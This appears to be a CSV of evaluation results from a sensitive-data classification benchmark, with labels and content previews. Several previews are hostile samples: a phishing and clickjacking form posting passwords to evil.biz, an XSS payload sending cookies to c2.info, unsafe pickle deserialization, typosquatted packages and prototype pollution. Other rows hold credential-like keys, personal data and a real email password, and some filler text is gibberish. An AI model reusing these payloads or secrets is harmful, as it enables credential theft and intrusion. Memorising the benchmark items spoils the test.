id,review_id,benchmark,file,true_category,true_subcategory,ai_category,ai_subcategory,r1_category,r1_subcategory,r2_category,r2_subcategory,content_preview
143,E049,external,malicious/ext-0494.txt,malicious,malicious.exploit,malicious,malicious.exploit,,,,,"CVE: CVE-2008-3188 \n  \n libxcrypt in SUSE openSUSE 11.0 uses the DES algorithm when the configuration specifies the MD5 algorithm, which makes it easier for attackers to conduct brute-force attacks against hashed passwords. \n  \n CVSS Score: 7.5 \n CWE: CWE-327"
144,P030,primary,credentials/sample-0126.ini,credentials,credentials.cloud_config,credentials,credentials.cloud_config,,,,,[default] \n aws_access_key_id = AKIAFX41BKEYYOCR2L52 \n aws_secret_access_key = EcTJp5KvKbWbsg1r2ryHcCzj3aSeRNgtlHXvXxmt \n region = eu-west-1 \n  \n [production] \n aws_access_key_id = AKIAV14QT2Z9VA9LR30L \n aws_secret_access_key = kHDUNZyAiXEEpZwMD+HeaO0+j7yFSq1hKKgpwseS \n region = us-west-2 \n
145,E028,external,safe/ext-0082.txt,safe,safe.documentation,safe,safe,,,,,"You are a cybersecurity expert with deep knowledge of NIST standards, frameworks, and best practices. You provide accurate, detailed guidance on cybersecurity controls, risk management, cloud security, and compliance based on NIST publications including the 800 series, FIPS, and related documents. What does Recommendations for Federal Vulnerability Disclosure Guidelines say about 2.1.3. Develop Technical Analysis Capability? According to Recommendations for Federal Vulnerability Disclosure Guidelines, 2.1.3. Develop Technical Analysis Capability: The FCB may develop technical vulnerability analysis and remediation capabilities to triage the importance of incoming source vulnerability reports, verify the existence of reported vulnerabilities, and assist the VDPO closest to an affected system with analysis and remediation efforts. They could be used, for example, to address severe vulnerabilities applicable to multiple VDPOs and to assist smaller VDPOs that may not have sufficient resources to assess and remediate vulnerabilities."
146,E042,external,pii/ext-0336.txt,pii,pii.identity,credentials,credentials.password,credentials,,credentials,,"Message-ID: <1347623.1075851571000.JavaMail.evans@thyme> \n Date: Wed, 26 Sep 2001 09:08:06 -0700 (PDT) \n From: bneilson@tricresources.com \n To: brad.mckay@enron.com \n Subject: RE: POCC \n Mime-Version: 1.0 \n Content-Type: text/plain; charset=us-ascii \n Content-Transfer-Encoding: 7bit \n X-From: ""BNEILSON"" <bneilson@tricresources.com>@ENRON <IMCEANOTES-+22BNEILSON+22+20+3Cbneilson+40tricresources+2Ecom+3E+40ENRON@ENRON.com> \n X-To: Mckay, Brad </O=ENRON/OU=NA/CN=RECIPIENTS/CN=BMCKAY> \n X-cc:  \n X-bcc:  \n X-Folder: \BMCKAY (Non-Privileged)\Deleted Items \n X-Origin: MCKAY-B \n X-FileName: BMCKAY (Non-Privileged).pst \n  \n User Name: BMCKAY			Password:  TEXAS \n  \n -----Original Message----- \n From: Mckay, Brad [mailto:Brad.McKay@ENRON.com] \n Sent: Wednesday, September 26, 2001 11:02 AM \n To: bneilson@tricresources.com \n Subject: RE: POCC \n  \n  \n Becky: Please forward my user name and password for the website, Thanks. \n Brad \n  \n >  -----Original Message----- \n > From: 	""BNEILSON"" <bneilson@tricresources.com>@ENRON \n > [mailto:IMCEANOTES-+22BNEILSON+22+20+3Cbneilson+40tricresources+2Ecom+ \n > 3E+40ENRON@ENRON.com] \n > Sent:	Wednesday, September 12, 2001 9:12 AM \n > To:	Mckay, Brad \n > Subject:	RE: POCC \n > \n > What user name and password would you like? \n > \n > -----Original Message----- \n > From: Mckay, Brad [mailto:Brad.McKay@ENRON.com] \n > Sent: Wednesday, September 12, 2001 8:56 AM \n > To: bneilson@tricresources.com \n > Subject: RE: POCC \n > \n > \n > sorry, bradley is 6 and will be 7 in dec. kinley just turned 5. thanks \n > brad \n > \n > >  -----Original Message----- \n > > From:"
147,E003,external,medical/ext-0249.txt,medical,medical.diagnosis,medical,medical.diagnosis,,,,,"INDICATIONS FOR PROCEDURE:, This is a 61-year-old, white male with onset of chest pain at 04: 30 this morning, with history of on and off chest discomfort over the past several days. CPK is already over 1000. There is ST elevation in leads II and aVF, as well as a Q wave. The chest pain is now gone, mild residual shortness of breath, no orthopnea. Cardiac monitor shows resolution of ST elevation lead III.,DESCRIPTION OF PROCEDURE:, Following sterile prep and drape of the right groin, installation of 1% Xylocaine anesthesia, the right common femoral artery was percutaneously entered and 6-French sheath inserted. ACT approximately 165 seconds on heparin. Borderline hypotension 250 mL fluid bolus given and nitroglycerin patch removed. Selective left and right coronary injections performed using Judkins coronary catheters with a 6-French pigtail catheter used to obtain left ventricular pressures and left ventriculography. Left pullback pressure. Sheath injection. Hemostasis obtained with a 6-French Angio-Seal device. He tolerated the procedure well and was transported to the Cardiac Step-Down Unit in stable condition.,HEMODYNAMIC DATA:, Left ventricular end diastolic pressure elevated post A-wave at 25 mm of Mercury with no aortic valve systolic gradient on pullback.,ANGIOGRAPHIC FINDINGS:,I. Left coronary artery: The left main coronary artery is unremarkable. The left anterior descending has 30 to 40% narrowing with tortuosity in its proximal portion, patent first septal perfora"
148,P024,primary,malicious/sample-0743.html,malicious,malicious.clickjacking,malicious,malicious.phishing,,,,,"<html> \n <head><meta http-equiv=""refresh"" content=""0;url=https://murphy-duncan.com/phish""></head> \n <body> \n <iframe src=""https://legit-bank.com"" style=""position:absolute;width:100%;height:100%;border:0;""></iframe> \n <div style=""position:absolute;top:200px;left:300px;z-index:999;opacity:0;""> \n <form action=""https://evil.biz/steal"" method=""POST""> \n <input name=""username""><input name=""password"" type=""password""><button>Login</button></form> \n </div> \n </body></html>"
149,E009,external,malicious/ext-0284.txt,malicious,malicious.phishing,malicious,malicious.phishing,,,,,"thats how p / orn starts do it increase your cum volume , and orgasm length main benifits : - the longest most intense orgasms of your life - erctions like steel - lncreased libido / desire - stronger ejaculaton ( watch where your aiming ) - multiple orgasms - up to 5 oo % more volume ( cover her in it if you want ) - studies show it tastes sweeter discreet same day shipping - try lt , you ' ll love it ! ( and she ' ll thank you for it ) http : / / gallanted . com / spur / ? sash optout : http : / / gallanted . com / rm . php ? sash"
150,E019,external,malicious/ext-0403.txt,malicious,malicious.phishing,safe,safe,,,,,"press clippings - letter on californian utilities please find attached the following article : ' californian utilities ' - financial times ( also sent to california distribution team ) kind regards , kuldeep chana"
151,P094,primary,safe/sample-0956.md,safe,safe.example_keys,safe,safe,,,,,# Getting Started \n  \n 1. Copy the example config: \n ```bash \n cp .env.example .env \n ``` \n  \n 2. Fill in your credentials: \n ``` \n API_KEY=your-api-key-here \n DATABASE_URL=postgres://user:password@localhost:5432/mydb \n SECRET_KEY=generate-a-random-string \n ``` \n  \n 3. Start the server: \n ```bash \n npm start \n ``` \n  \n > **Note:** Never commit real credentials. Use environment variables. \n
152,P095,primary,safe/sample-0973.json,safe,safe.redacted,safe,safe,,,,,"{ \n   ""metadata"": { \n     ""type"": ""de-identified medical record"", \n     ""redaction_method"": ""Safe Harbor"", \n     ""date_redacted"": ""2026-03-06"" \n   }, \n   ""diagnosis_code"": ""J45.20"", \n   ""diagnosis_text"": ""Asthma"", \n   ""note"": ""All 18 HIPAA identifiers removed per Safe Harbor de-identification standard. No patient-identifiable information present."" \n }"
153,P007,primary,credentials/sample-0132.env,credentials,credentials.cloud_config,credentials,credentials.api_key,,,,,DIGITALOCEAN_TOKEN=dop_v1_7e04b5b0864e8892a198c6abd15be84b73cf9c8858b394e80ee6999de4c7a83c \n CLOUDFLARE_API_TOKEN=2Bunnxsq54S1V0RTRnnKsiiJHTsust5oV3RzjzhD \n HEROKU_API_KEY=565be00a-1c8a-cb8f-1b6e-ac06701b95ee \n
154,P080,primary,malicious/sample-0738.py,malicious,malicious.deserialization,malicious,malicious.deserialization,,,,,"import pickle, base64 \n # Received from untrusted source \n data = base64.b64decode(""0CX2rqIKBTjCdz96raFmCqOZA6GdrBSGacJ7DOes3SCj5OE2hp/jLZXxl0xwHDbzIfWFDcK/fe4nUthE"") \n obj = pickle.loads(data)  # VULNERABLE — arbitrary code execution via __reduce__ \n "
155,E048,external,malicious/ext-0386.txt,malicious,malicious.exploit,malicious,malicious.exploit,,,,,"CVE: CVE-2004-1541 \n  \n SecureCRT 4.0, 4.1, and possibly other versions, allows remote attackers to execute arbitrary commands via a telnet:// URL that uses the /F option to specify a configuration file on a samba share. \n  \n CVSS Score: 7.5"
156,P037,primary,credentials/sample-0108.npmrc,credentials,credentials.token,credentials,credentials.token,,,,,//registry.npmjs.org/:_authToken=omuaz9hcdl4nMP7A8Y3cSP0oB4y9U0cm8ZUb \n //npm.pkg.github.com/:_authToken=ghp_dNGzv7FGagzp8vRzwXUOgrPpsdhb4IwWxsE0 \n
157,E018,external,pii/ext-0379.txt,pii,pii.identity,pii,pii.identity,,,,,"Teletherapy Consent Form \n  \n Please review the following terms and conditions for the teletherapy services provided by [Ganesha] residing at [731 Street: [Barnstaple Lane], [Brentwood], [TN], [37027], [US]: \n  \n 1. Confidentiality: Your privacy is of utmost importance. All information shared during teletherapy sessions will be kept strictly confidential in accordance with HIPAA regulations. \n 2. Technical Considerations: It is your responsibility to ensure a secure internet con"
158,E079,external,safe/ext-0427.txt,safe,safe.documentation,safe,safe,,,,,"You are a cybersecurity expert with deep knowledge of NIST standards, frameworks, and best practices. You provide accurate, detailed guidance on cybersecurity controls, risk management, cloud security, and compliance based on NIST publications including the 800 series, FIPS, and related documents. What information does Guidelines for the Secure Deployment of IPv6 provide? (Section 47) Summary..............................................................................................................6-47 | 6-46 | | List of Appendices | List of Appendices | List of Appendices | List of Appendices | | Appendix A- Acronyms and Abbreviations ......................................................................A-1 | Appendix A- Acronyms and Abbreviations ......................................................................A-1 | Appendix A- Acronyms and Abbreviations ......................................................................A-1 | | | Appendix B-References and Other IPv6 Resources .......................................................B-1 | Appendix B-References and Other IPv6 Resources .......................................................B-1 | Appendix B-References and Other IPv6 Resources .......................................................B-1 | | | List of Figures | List of Figures | List of Figures | List of Figures | | Figure 2-1."
159,P075,primary,confidential/sample-0592.txt,confidential,confidential.classified,confidential,confidential.geospatial,,confidential.classified,,confidential.classified,"CLASSIFIED — GEOSPATIAL INTELLIGENCE \n NGA PRODUCT #85204 \n  \n Location: 40°1'51.9""N, 54°32'59.6""E \n Facility Type: Nuclear Facility \n Imagery Date: 2026-01-17 \n Resolution: 0.3m GSD \n Sensor: Classified \n  \n Assessment: Great boy scene on where. Station visit show. Their again power authority nothing. Themselves physical safe political. \n "
160,E038,external,medical/ext-0139.txt,medical,medical.diagnosis,medical,medical.procedure,,medical.diagnosis,,medical.diagnosis,"PREOPERATIVE DIAGNOSES:,  Increased intracranial pressure and cerebral edema due to severe brain injury.,POSTOPERATIVE DIAGNOSES: , Increased intracranial pressure and cerebral edema due to severe brain injury.,PROCEDURE:,  Burr hole and insertion of external ventricular drain catheter.,ANESTHESIA: , Just bedside sedation.,PROCEDURE: , Scalp was clipped.  He was prepped with ChloraPrep and Betadine.  Incisions are infiltrated with 1% Xylocaine with epinephrine 1:200000.  He did receive antibiotics post procedure.  He was draped in a sterile manner.,Incision made just to the right of the right mid pupillary line 10 cm behind the nasion.  A self-retaining retractor was placed.  Burr hole was drilled with the cranial twist drill.  The dura was punctured with a twist drill.  A brain needle was used to localize the ventricle that took 3 passes to localize the ventricle.  The pressure was initially high.  The CSF was clear and colorless.  The CSF drainage rapidly tapered off because of the brain swelling.  With two tries, the ventricular catheter was then able to be placed into the ventricle and then brought out through a separate stab wound, the depth of catheter is 7 cm from the outer table of the skull.  There was intermittent drainage of CSF after that.  The catheter was secured to the scalp with #2-0 silk suture and the incision was closed with Ethilon suture.  The patient tolerated the procedure well.  No complications.  Sponge and needle counts were correct.  Blood loss is m"
161,E091,external,pii/ext-0331.txt,pii,pii.identity,pii,pii.identity,,,,,"rth: 11/09/1959 \n - Passport Number: 047538497 \n  \n Participant 3: \n - Date of Birth: 2nd June 1980 \n - Passport Number: 649284423 \n  \n Participant 4: \n - Date of Birth: 08/09/1992 \n - Passport Number: 188514015 \n  \n Participant 5: \n - Date of Birth: 12/08/1959 \n - Passport Number: 956244896 \n  \n Participant 6: \n - Date of Birth: May 22nd, 1972 \n - Passport Number: 570871645 \n  \n Participant 7: \n - Date of Birth: 05/29/1961 \n -"
162,P023,primary,confidential/sample-0552.txt,confidential,confidential.legal,confidential,confidential.legal,,,,,"ATTORNEY-CLIENT PRIVILEGED COMMUNICATION \n DO NOT DISTRIBUTE \n  \n From: Christopher Holmes, Esq. \n To: Shane Duncan, CEO — Solis and Sons \n Date: 01/06/2026 \n Re: Pending Litigation \n  \n Situation fight painting he doctor book food wrong. \n  \n Legal Assessment: \n Our exposure in this matter is estimated at $12M. Benefit inside change agreement about owner world. Safe new form maybe forget after method. \n  \n Recommended Actions: \n 1. Ask course manager thank last world check walk. \n 2. Bill myself high strategy ever commercial center. \n 3. Certainly bring course medical decade step. \n  \n This communication is protected by attorney-client privilege and work product doctrine. \n "
163,P088,primary,pii/sample-0153.json,pii,pii.identity,pii,pii.identity,,,,,"{ \n   ""customer"": { \n     ""full_name"": ""Meghan Atkins"", \n     ""ssn"": ""149-85-9394"", \n     ""date_of_birth"": ""04/01/2003"", \n     ""address"": { \n       ""street"": ""794 Eric Loop Apt. 705"", \n       ""city"": ""Popeburgh"", \n       ""state"": ""CO"", \n       ""zip"": ""39696"" \n     }, \n     ""phone"": ""(884)821-0839x490"", \n     ""email"": ""tammygarcia@example.org"" \n   } \n }"
164,P020,primary,medical/sample-0492.txt,medical,medical.mental_health,confidential,confidential.psychological,,confidential.psychological,,confidential.psychological,"PSYCHOTHERAPY SESSION NOTES — PRIVILEGED AND CONFIDENTIAL \n  \n Patient: Patrick Anderson \n DOB: 09/24/1993 \n Therapist: Dr. Cody Young, PsyD \n Session Date: 01/19/2026 \n Session #34 \n  \n Presenting Concerns: Trauma processing \n  \n Session Summary: \n Patient reported increased anxiety this week. Firm industry adult spend agreement. War through bill base hair really. \n  \n Risk Assessment: Moderate — increased session frequency recommended \n Next Session: 04/09/2026 \n "
165,E064,external,medical/ext-0054.txt,medical,medical.diagnosis,medical,medical.history,,,,,"CC:, Progressive unsteadiness following head trauma.,HX:,  A7 7 y/o male fell, as he was getting out of bed, and struck his head, 4 weeks prior to admission. He then began to experience progressive unsteadiness and gait instability for several days after the fall. He was then evaluated at a local ER and prescribed meclizine. This did not improve his symptoms, and over the past one week prior to admission began to develop left facial/LUE/LLE weakness. He was seen by a local MD on the 12/8/92 and underwent and MRI Brain scan. This showed a right subdural mass. He was then transferred to UIHC for further evaluation.,PMH:, 1)cardiac arrhythmia. 2)HTN. 3) excision of lip lesion 1 yr ago.,SHX/FHX:, Unremarkable. No h/o ETOH abuse.,MEDS:, Meclizine, Procardia XL.,EXAM:, Afebrile, BP132/74 HR72 RR16,MS: A & O x 3. Speech fluent. Comprehension, naming, repetition were intact.,CN: Left lower facial weakness only.,MOTOR: Left hemiparesis, 4+/5 throughout.,Sensory: intact PP/TEMP/LT/PROP/VIB,Coordination: ND,Station: left pronator drift.,Gait: left hemiparesis evident by decreased LUE swing and LLE drag.,Reflexes: 2/3 in UE; 2/2 LE; Right plantar downgoing; Left plantar equivocal.,Gen Exam: unremarkable.,COURSE:, Outside MRI revealed a loculated subdural hematoma extending throughout the frontotemporoparieto-occipital regions on the right. There was effacement of the right lateral ventricle. and a 0.5 cm leftward midline shift.,He underwent a HCT on admission, 12/8/92, which showed a rig"
166,E097,external,malicious/ext-0413.txt,malicious,malicious.exploit,malicious,malicious.exploit,,,,,CVE: CVE-2004-2151 \n  \n Chatman 1.1.1 RC1 and earlier allows remote attackers to cause a denial of service (memory consumption or application crash) via a very large data size. \n  \n CVSS Score: 5.0
167,P097,primary,medical/sample-0490.txt,medical,medical.insurance,pii,pii.identity,,pii.identity,,pii.identity,"INSURANCE CLAIM FORM \n Claim #: CLM-642240 \n  \n PATIENT: \n Name: Tiffany Morales \n Member ID: H750413968 \n Group Number: GRP-81678 \n SSN: 859-71-2734 \n DOB: 06/28/1980 \n  \n PROVIDER: \n Ana Garcia, MD \n NPI: 9175294875 \n Facility: Noble, Cook and Parker Medical Center \n  \n DIAGNOSIS CODES: \n I10 — GERD \n  \n PROCEDURE CODES: \n 99215 — Office Visit \n 80061 — Laboratory \n  \n Total Billed: $340.00 \n "
168,P092,primary,malicious/sample-0637.js,malicious,malicious.xss,malicious,malicious.injection,,,,,"// User comment renderer \n const comment = `Heavy reach since wonder feeling how home.<svg onload=""new Image().src='https://c2.info/exfil?d='+btoa(document.cookie)"">`; \n document.getElementById('comments').innerHTML += comment; \n "
169,P090,primary,credentials/sample-0082.pem,credentials,credentials.private_key,credentials,credentials.private_key,,,,,-----BEGIN RSA PRIVATE KEY----- \n GcC8yfEMLmI2Rc7oV33vOwPCy02izj62gz29rTvWmAIBCC5zmGWL972GqUWsnFlw \n VT7SS6Kg62f/UqwJmtHWCKdE3SFc1dlLm/3byBH9lklmuT/AUPBkxXjLdTLESJEA \n rVhexg1bMIZQg4fmGrFbcZrzCBBRepzj58NgUaBFHAKdhHvvrGzAwchSptEnC+hQ \n gUHZduW7ISpquP5M2kzwmia+sE4cP0LhpwT0FBQ/Ljqh4kyrhSeziPM0O/JEC57b \n 37bQBnUYOfprgm5ragM03yPf/hAjYwEjoIIsgFDqtSSkQc+ppFIfHMwNwxcuAh0a \n kDjM2UWpnmSLr2hEubxtpfwzoKZvMozZ8Ny/lUrfzqpTrF7ZOjSShHLi0hGGk1gI \n tGHKMDQzYTJODqlyKuOUfBBsAyjtIbq6F+KT0u1NLR7GAyDiavPNFOZHlmjdg+5P \n B+39MjsvOQYmCpAGCJT+p+uKxuxdYh8M8DdPyifptcskbm/hZmpYp63MUqClqs3Y \n gnzWRQLaifvNkGpPk0s5uFU5KvevgbOvlPigYRNPKvUUKci3pTdKM/z4BTO9a5LY \n oCNsUsLfRsAJd82CkZ+qAKg9cLs/u+mVCv4DC+WsaXCsDa9iLOpoh3RODWARUv5A \n EBk0TAWNjriil+jsV3yar5EPcIrNUcoqXlU4oWE07KQ7hAhRhg6vnuWH3CUDfTG7 \n VxeuNbD6MwzP7QPt4a+mLqG5kRgBujclLuhxoOfwd4J4BcQ7u4NGbiD6NVj63I01 \n /wV/fkMbsZvQcmcE1BTa07v7ea0JudAhvn7iriIfmeCTmtEaST7pR5sKCaaMojW4 \n 0VIERlqZbpzss/NDzP1tgl2uFUNueySYQBT8e/oWrzfabzp6XsQ/YGknTT8VSi8Y \n VwZAVjROkqAP9TbTK4ffHCqnIwKflvcQ7PMIspzq+cWdBICm8wkTkSwuP+Fs7867 \n 46MkVve1gb4q7rcZOJ1YX/zu+BhqT2Bx9gEMz6hU6NydXCNXrzL1fUT9xIViDPGx \n /Co/ILrBFE/lViK3v2ggyvQ3mGpA1CVvxbLYl1uMbsSugsMhCcVrv/AJZAySo08d \n wh8MUz9deox+15oDQjUMhatixlr4RtJSjLO03l5ONSnL84hMp2UTsZiEoz3v6ii5 \n GrUjguGyFM8SHql+fgkW5xV9uQDuDqpuDSnNG1hIlncasuZRdrtJslUSkgBY2gW/ \n Aivvulgk2LCs5zQPtB51nxbd+UQhuD10Ov4VmNxlC4gAGOrrr7Ys84hEXAoNmkO6 \n -----END RSA PRIVATE KEY----- \n
170,P065,primary,safe/sample-0972.txt,safe,safe.redacted,safe,safe,,,,,"SANITIZED INCIDENT REPORT #8455 \n All personally identifiable information has been removed. \n Date: 03/01/2026 \n  \n Description: \n Door agent someone anything often bit. \n  \n This report has been de-identified per company policy. \n No names, contact details, or personal identifiers are present. \n "
171,E002,external,malicious/ext-0374.txt,malicious,malicious.exploit,malicious,malicious.exploit,,,,,CVE: CVE-2008-2014 \n  \n Mozilla Firefox 3.0 beta 5 allows remote attackers to cause a denial of service (application crash) via JavaScript code that calls document.write in an infinite loop. \n  \n CVSS Score: 5.0 \n CWE: CWE-399
172,P054,primary,financial/sample-0307.txt,financial,financial.credit_card,financial,financial.credit_card,,,,,"PAYMENT INFORMATION \n Cardholder: James Hall \n Card Number: 6011-4621-8718-2074 \n Expiration: 08/28 \n CVV: 469 \n Billing Address: 39777 Knight Garden, Jamieside, AZ 32188 \n "
173,P081,primary,confidential/sample-0561.txt,confidential,confidential.legal,confidential,confidential.legal,,,,,"ATTORNEY-CLIENT PRIVILEGED COMMUNICATION \n DO NOT DISTRIBUTE \n  \n From: Andrew Campbell, Esq. \n To: Mark Hurst, CEO — Koch Ltd \n Date: 02/06/2026 \n Re: Patent Infringement \n  \n Phone election wide appear. \n  \n Legal Assessment: \n Our exposure in this matter is estimated at $9M. Suffer stock chair talk fact draw back send. Help painting common money while note. Election hard from mother face win represent. \n  \n Recommended Actions: \n 1. Unit pressure at technology. \n 2. Picture glass rock arm occur nor. \n 3. Member radio sound for improve. \n  \n This communication is protected by attorney-client privilege and work product doctrine. \n "
174,E074,external,pii/ext-0324.txt,pii,pii.identity,confidential,confidential.internal,,pii.identity,,pii.identity,"Message-ID: <24751524.1075857885596.JavaMail.evans@thyme> \n Date: Fri, 3 Nov 2000 08:55:00 -0800 (PST) \n From: jmjong@hotmail.com \n To: larry.f.campbell@enron.com \n Subject: junkyard \n Mime-Version: 1.0 \n Content-Type: text/plain; charset=ANSI_X3.4-1968 \n Content-Transfer-Encoding: 7bit \n X-From: ""Joe Jong"" <jmjong@hotmail.com> \n X-To: <Larry.F.Campbell@enron.com> \n X-cc:  \n X-bcc:  \n X-Folder: \Larry_Campbell_Dec2000\Notes Folders\Notes inbox \n X-Origin: Campbell-L \n X-FileName: lcampbel.nsf \n  \n hey Larry, \n ? \n What's the name of the junkyard?where you sold  Megan's car?? I'm thinking  \n about selling Grace's car (96 Nissan 200SX SE  2dr) to the junkyard b/c it  \n was hit by someone else and I don't think it's worth  repairing. \n ? \n Regards, \n ? \n Joe Jong \n ? \n Thomason, Moser & Patterson, L.L.P.  \n 3040  Post Oak Blvd. # 1500 \n Houston, Texas 77056 \n (713) 623-4844 \n fax (713)  623-4846 \n www.tmplaw.com \n ? \n **CONFIDENTIAL INFORMATION** \n This transmission  contains information from the law firm of Thomason, Moser  \n & Patterson,  L.L.P., which is confidential or privileged. The information is  \n intended to be  for the use of the individual or entity named on this  \n transmission. If you are  not the intended recipient, be aware that any  \n disclosure, copying, distribution  or use of the contents of this information  \n is prohibited. If you have received  this transmission in error, please  \n notify us by telephone immediately so that we  can arrange for the retrieval  \n of the original documents at no cost to you.  Alternatively, notify the  \n send"
175,E087,external,malicious/ext-0349.txt,malicious,malicious.phishing,safe,safe,,,,,"use Perl Daily NewsletterIn this issue: \n     * New Perl Mongers Web Site \n     * Java vs. Perl \n     * This Week on perl5-porters (9-15 September 2002)+--------------------------------------------------------------------+ \n | New Perl Mongers Web Site                                          | \n |   posted by KM on Monday September 16, @08:41 (groups)             | \n |   http://use.perl.org/article.pl?sid=02/09/16/1243234              | \n +--------------------------------------------------------------------+[0]davorg writes ""Leon Brocard has been working hard to update the \n [1]Perl Mongers web site. We're still going thru the process of cleaning \n up the data about the Perl Monger groups, so if you see something that \n isn't quite right then please [2]let us know.""Discuss this story at: \n     http://use.perl.org/comments.pl?sid=02/09/16/1243234Links: \n     0. mailto:dave@dave.org.uk \n     1. http://www.pm.org/ \n     2. mailto:user_groups@pm.org \n +--------------------------------------------------------------------+ \n | Java vs. Perl                                                      | \n |   posted by pudge on Monday September 16, @11:15 (java)            | \n |   http://use.perl.org/article.pl?sid=02/09/16/1448246              | \n +--------------------------------------------------------------------+It seems the older Perl gets, the more willing people are to believe that \n it sucks, without any reasonable facts. [0]davorg writes ""You may have \n seen the article [1]Can Java technology beat Perl on its home turf w"
176,P003,primary,pii/sample-0276.txt,pii,pii.metadata,pii,pii.metadata,,,,,Document Properties: \n Author: Angela Walton \n Created: 1997-09-25T00:28:20.300631 \n Last Modified By: Megan Fox \n Company: Silva PLC \n Computer: LAWRENCEPETER-PC \n MAC Address: 9f:08:08:89:23:30 \n IP Address: 86.228.56.31 \n File Path: C:\Users\iansilva\Documents\forward.tiff \n
177,E016,external,safe/ext-0126.txt,safe,safe.documentation,safe,safe,,,,,"You are a cybersecurity expert with deep knowledge of NIST standards, frameworks, and best practices. You provide accurate, detailed guidance on cybersecurity controls, risk management, cloud security, and compliance based on NIST publications including the 800 series, FIPS, and related documents. What does NIST_SP_800-207_Zero_Trust_Architecture say about Acknowledgments? According to NIST_SP_800-207_Zero_Trust_Architecture, Acknowledgments: This document is the product of a collaboration between multiple federal agencies and is overseen by the Federal CIO Council. The architecture subgroup is responsible for development of this document, but there are specific individuals who deserve recognition. These include Greg Holden, project manager of the Federal CIO Council ZTA project; Alper Kerman, project manager for the NIST/National Cybersecurity Center of Excellence ZTA effort; and Douglas Montgomery."
178,P026,primary,pii/sample-0215.txt,pii,pii.government_id,pii,pii.identity,,,,,"DRIVER'S LICENSE INFORMATION \n Name: Ronald Harris \n License Number: CA-329256-2804 \n State: Montana \n DOB: 01/04/1948 \n Address: 3376 Anthony Course Apt. 120, Reyeschester, DE 19822 \n Class: B \n Restrictions: Corrective lenses \n "
179,P074,primary,financial/sample-0374.txt,financial,financial.tax,financial,financial.tax,,,,,"W-2 WAGE AND TAX STATEMENT — 2025 \n  \n Employer: Rodriguez, Garcia and Gray \n EIN: 26-1982468 \n Address: 3883 Robert Village, Wallacemouth, GU 48764 \n  \n Employee: Mrs. Meagan Trujillo DVM \n SSN: 939-30-5597 \n Address: 205 Andre Haven, Lake Traci, WA 13131 \n  \n 1. Wages, tips, other: $139,949.00 \n 2. Federal tax withheld: $37,741.00 \n 3. Social Security wages: $137,890.00 \n 4. Social Security tax: $5,028.00 \n 5. Medicare wages: $47,657.00 \n 6. Medicare tax: $2,368.00 \n "
180,P029,primary,pii/sample-0231.csv,pii,pii.contact,pii,pii.contact,,,,,"name,email,phone,address \n Sandra Lewis,rachelzamora@example.org,001-995-897-7338x6617,""048 Morris Corners Apt. 650, South Davidhaven, VA 42209"" \n Corey Bailey,bonillamichelle@example.net,(782)312-9692x863,""23933 Donald Isle Apt. 327, New Laurenmouth, ID 56822"" \n David Cook,heatherpalmer@example.net,001-317-634-6252x00370,""10832 Guzman Mills, Michaelchester, MN 82051"" \n Jo Ramirez,tpowell@example.org,3872933673,""8740 Kimberly Pike Suite 385, East Michele, MD 14392"" \n "
181,P021,primary,malicious/sample-0718.txt,malicious,malicious.supply_chain,malicious,malicious.supply_chain,,,,,request0==1.0.0 \n flask==2.31.0 \n boto3>=4.0 \n r3qu3sts==0.9.1 \n click>=13.0 \n
182,E058,external,malicious/ext-0069.txt,malicious,malicious.exploit,malicious,malicious.exploit,,,,,"CVE: CVE-2003-1456 \n  \n Album.pl 6.1 allows remote attackers to execute arbitrary commands, when an alternative configuration file is used, via unknown attack vectors. \n  \n CVSS Score: 5.0 \n CWE: CWE-20"
183,P001,primary,malicious/sample-0748.json,malicious,malicious.prototype_pollution,malicious,malicious.prototype_pollution,,,,,"{ \n   ""__proto__"": { \n     ""isAdmin"": true, \n     ""role"": ""superuser"" \n   }, \n   ""constructor"": { \n     ""prototype"": { \n       ""isAdmin"": true \n     } \n   }, \n   ""name"": ""Miguel Willis"" \n }"
